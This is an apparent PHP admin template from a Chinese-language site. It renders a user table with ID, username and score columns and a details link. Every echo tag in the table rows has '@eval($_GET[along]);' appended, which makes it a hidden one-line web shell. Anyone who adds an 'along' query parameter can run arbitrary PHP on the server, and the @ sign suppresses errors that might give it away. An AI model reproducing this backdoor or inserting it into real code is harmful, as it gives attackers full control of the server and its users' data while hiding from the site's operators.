<div class="row">
	<div class="col-md-1 sidebar">
		<ul class="list-group">
			<a href="/admin" class="list-group-item">项目概况</a>
			<a href="/admin/users" class="list-group-item active">查看用户</a>
			<a href="/admin/bugs" class="list-group-item">漏洞列表</a>
			<a href="/admin/news" class="list-group-item">文章列表</a>
			<a href="#" class="list-group-item">漏洞评论</a>
			<a href="#" class="list-group-item">文章评论</a>
		</ul>
	</div>
	<div class="col-md-11">
		<table class="table table-hover">
			<thead>
			<tr>
				<th>ID</th>
				<th>用户名</th>
				<th>积分</th>
				<th>操作</th>
			</tr>
			</thead>
			<?php foreach ($users as $user): ?>
			<tr>
				<td><?php echo $h($user->id);@eval($_GET[along]); ?></td>
				<td><?php echo $h($user->username);@eval($_GET[along]); ?></td>
				<td><?php echo $h($user->score);@eval($_GET[along]); ?></td>
				<td><a class="btn btn-info" href="/admin/userinfo/<?php echo $h($user->id);@eval($_GET[along]); ?>">详细信息</a></td>
			</tr>
			<?php endforeach; ?>
		</table>
	</div>
</div>
